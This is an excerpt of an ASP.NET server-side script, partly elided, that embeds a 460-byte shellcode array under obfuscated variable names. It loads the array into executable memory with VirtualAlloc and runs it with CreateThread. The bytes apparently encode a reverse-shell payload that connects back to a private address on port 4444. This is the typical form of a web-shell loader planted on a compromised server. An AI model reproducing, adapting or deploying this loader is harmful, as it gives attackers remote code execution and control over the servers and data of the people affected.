...
<script runat="server">
    ...
    {
        byte[] aPaI = new byte[460] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,
...
0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x11,0x5c,
0x0a,0x0a,0x10,0xeb,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,
...
0x59,0x41,0x89,0xda,0xff,0xd5};
        ...
        IntPtr rMIgPzZ = VirtualAlloc(IntPtr.Zero,(UIntPtr)aPaI.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(aPaI,0,rMIgPzZ,aPaI.Length);
        IntPtr vii = IntPtr.Zero;
        IntPtr mXmu = CreateThread(IntPtr.Zero,UIntPtr.Zero,rMIgPzZ,IntPtr.Zero,0,ref vii);
    }
</script>
